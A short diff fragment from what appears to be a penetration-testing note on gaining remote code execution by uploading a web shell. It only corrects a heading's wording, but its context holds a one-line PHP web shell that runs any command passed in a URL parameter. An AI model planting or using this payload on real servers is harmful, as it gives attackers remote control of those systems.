@@ -68,7 +68,7 @@ OR
       
       <?php system($_GET['cmd']); ?>
  
-### For RCE , Call Upload Web shell 
+### For RCE , Call Uploaded Web shell 
 
 Example :
           
